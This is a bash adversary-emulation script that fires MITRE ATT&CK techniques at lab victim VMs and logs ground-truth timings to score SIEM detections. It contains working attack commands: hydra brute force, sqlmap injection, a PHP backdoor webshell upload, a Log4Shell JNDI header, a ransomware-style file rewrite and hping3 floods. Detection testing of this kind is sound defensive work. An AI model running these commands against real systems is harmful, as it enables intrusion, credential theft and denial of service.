#!/usr/bin/env bash
# 09_attack_runner.sh — MITRE ATT&CK adversary-emulation runner (paper §10.4)
#
# RUNS ON KALI (attacker VM). Fires each attack vector at your OWN lab victim
# VMs and records a ground-truth CSV (technique + exact execution time) that
# 10_score_detections.py uses to compute TP/FP/FN, accuracy, F1 and latency.
#
# SCOPE / SAFETY: this is for a controlled, isolated lab against victim VMs you
# own, on a private host-only network. Do NOT point it at the VPS, the public
# internet, or any host you are not authorised to test. DDoS vectors are rate-
# and count-bounded on purpose. Review before running.
#
# Usage:
#   ./09_attack_runner.sh --linux 192.168.64.10 --windows 192.168.64.11 \
#       --web http://192.168.64.10:8080 --gt ground_truth_wazuh_tier1.csv
#   # pick specific vectors:
#   ./09_attack_runner.sh --linux 192.168.64.10 --only brute,web --gt gt.csv
#   # record timings without firing (test the pipeline):
#   ./09_attack_runner.sh --linux 192.168.64.10 --dry-run --gt gt.csv
set -uo pipefail

LINUX=""; WINDOWS=""; WEB=""; GT="ground_truth.csv"; ONLY="all"; DRY=0
USERLIST="users.txt"; PASSLIST="passwords.txt"
SSH_USER="${SSH_USER:-mark}"   # non-root login for the Linux FIM/EICAR steps (Option B)

while [ $# -gt 0 ]; do
  case "$1" in
    --linux)   LINUX="$2"; shift 2;;
    --windows) WINDOWS="$2"; shift 2;;
    --web)     WEB="$2"; shift 2;;
    --gt)      GT="$2"; shift 2;;
    --only)    ONLY="$2"; shift 2;;        # comma list: sys,malware,brute,web,ddos
    --userlist) USERLIST="$2"; shift 2;;
    --passlist) PASSLIST="$2"; shift 2;;
    --ssh-user) SSH_USER="$2"; shift 2;;   # victim SSH user for FIM steps (default: mark)
    --dry-run) DRY=1; shift;;
    *) echo "Unknown arg: $1"; exit 1;;
  esac
done

[ -z "$LINUX" ] && { echo "[!] --linux <victim ip> is required"; exit 1; }
FIM_DIR="/home/${SSH_USER}/fimtest"   # monitored dir the Wazuh agent watches (see agents/ installer)

# --- ground-truth logging ----------------------------------------------------
if [ ! -f "$GT" ]; then
  echo "Scenario,Vector,MITRE_Technique,Tool,Target,Exec_ISO,Exec_Epoch,Notes" > "$GT"
fi
want() { [ "$ONLY" = "all" ] && return 0; echo ",$ONLY," | grep -q ",$1,"; }
log_gt() { # scenario vector technique tool target notes
  local iso epoch; iso=$(date -u +%Y-%m-%dT%H:%M:%SZ); epoch=$(date +%s)
  echo "\"$1\",\"$2\",\"$3\",\"$4\",\"$5\",$iso,$epoch,\"$6\"" >> "$GT"
  echo "[GT] $iso  $3  $1  -> $5"
}
fire() { # description + command; respects --dry-run
  echo "    \$ $*"
  [ "$DRY" = "1" ] && { echo "    (dry-run, not executed)"; return 0; }
  eval "$@" || echo "    [!] command returned non-zero (continuing)"
}

[ -f "$USERLIST" ] || printf 'root\nadmin\nubuntu\nalice\nbob\n' > "$USERLIST"
[ -f "$PASSLIST" ] || printf 'password\n123456\nadmin123\nletmein\nP@ssw0rd\n' > "$PASSLIST"

echo "================================================="
echo " ADVERSARY EMULATION RUN  (ground truth -> $GT)"
echo " Linux=$LINUX  Windows=${WINDOWS:-none}  Web=${WEB:-none}  Only=$ONLY  DryRun=$DRY"
echo "================================================="

# --- 1. System / Network: RCE + Privilege Escalation  (T1210 / T1068) --------
if want sys; then
  echo "[*] System/Network attacks (T1210 / T1068)"
  log_gt "RCE scan + exploit attempt" "System/Network" "T1210" "nmap/metasploit" "$LINUX" "aggressive service scan + exploit probe"
  fire "nmap -sV -A -T4 -p- $LINUX"
  # Example exploit probe against a deliberately vulnerable lab service.
  # Replace EXPLOIT/RHOSTS with the module matching your vulnerable victim.
  fire "msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_version; set RHOSTS $LINUX; run; exit'"
  log_gt "Privilege escalation probe" "System/Network" "T1068" "linpeas/exploit" "$LINUX" "post-access privesc enumeration (run on victim if shell obtained)"
fi

# --- 2. Malware / FIM: ransomware sim + file modification (T1486 / T1204.002)-
# These are ENDPOINT actions -> executed ON the victim over SSH so its agent logs them.
if want malware; then
  echo "[*] Malware / FIM attacks (T1486 / T1204.002)  -- executed on victim via SSH as $SSH_USER"
  log_gt "EICAR malicious file drop" "Malware" "T1204.002" "EICAR" "$LINUX" "writes EICAR test string to monitored dir $FIM_DIR"
  fire "ssh ${SSH_USER}@$LINUX 'mkdir -p $FIM_DIR && printf %s \"X5O!P%@AP[4\\\\\\\\PZX54(P^)7CC)7}\\\$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!\\\$H+H*\" > $FIM_DIR/eicar.com'"
  log_gt "Ransomware-style mass file rewrite" "Malware" "T1486" "FIM script" "$LINUX" "rapidly rewrites files in monitored dir to trigger FIM"
  fire "ssh ${SSH_USER}@$LINUX 'mkdir -p $FIM_DIR && for i in \$(seq 1 50); do echo ENCRYPTED_\$RANDOM > $FIM_DIR/file_\$i.locked; done'"
fi

# --- 3. Brute force: SSH / RDP / DB  (T1110.001 / T1110.003) ------------------
if want brute; then
  echo "[*] Brute-force attacks (T1110.001 / T1110.003)"
  log_gt "SSH credential guessing" "Brute Force" "T1110.001" "hydra" "$LINUX" "16-thread SSH brute"
  fire "hydra -L $USERLIST -P $PASSLIST -t 16 -f ssh://$LINUX"
  if [ -n "$WINDOWS" ]; then
    log_gt "RDP credential guessing" "Brute Force" "T1110.001" "hydra" "$WINDOWS" "RDP brute"
    fire "hydra -L $USERLIST -P $PASSLIST -t 8 rdp://$WINDOWS"
  fi
  log_gt "MySQL credential guessing" "Brute Force" "T1110.003" "hydra" "$LINUX" "DB password spray"
  fire "hydra -L $USERLIST -P $PASSLIST -t 8 mysql://$LINUX"
fi

# --- 4. Web application: SQLi / webshell / Log4j  (T1505.003 / T1190) ---------
if want web && [ -n "$WEB" ]; then
  echo "[*] Web application attacks (T1505.003 / T1190) against $WEB"
  log_gt "SQL injection" "Web App" "T1190" "sqlmap" "$WEB" "automated SQLi"
  fire "sqlmap -u '$WEB/?id=1' --batch --level=2 --risk=2"
  log_gt "Webshell upload" "Web App" "T1505.003" "curl/php webshell" "$WEB" "attempt PHP webshell upload"
  fire "curl -s -F 'file=@/usr/share/webshells/php/simple-backdoor.php' '$WEB/upload.php' -o /dev/null -w '%{http_code}\n'"
  log_gt "Log4Shell JNDI probe" "Web App" "T1190" "curl" "$WEB" "Log4j exploit string in header"
  fire "curl -s '$WEB/' -H 'User-Agent: \${jndi:ldap://127.0.0.1:1389/a}' -o /dev/null"
elif want web; then
  echo "[!] web vector selected but --web <url> not set; skipping"
fi

# --- 5. DDoS: SYN flood + UDP flood  (T1498.001 / T1499) ----------------------
# Bounded with --flood replaced by fixed --count so this stays a lab signal,
# NOT an uncapped flood. Keep counts small; raise only on your own victim.
if want ddos; then
  echo "[*] DDoS attacks (T1498.001 / T1499) -- bounded packet counts"
  log_gt "TCP SYN flood (bounded)" "DDoS" "T1499" "hping3" "$LINUX" "10000 SYN packets, count-bounded"
  fire "sudo hping3 -S -p 80 -c 10000 -i u200 $LINUX"
  log_gt "UDP flood (bounded)" "DDoS" "T1498.001" "hping3" "$LINUX" "10000 UDP packets, count-bounded"
  fire "sudo hping3 --udp -p 53 -c 10000 -i u200 $LINUX"
fi

echo "================================================="
echo " Run complete. Ground truth appended to: $GT"
echo " Next: extract alerts, then score with 10_score_detections.py"
echo "================================================="
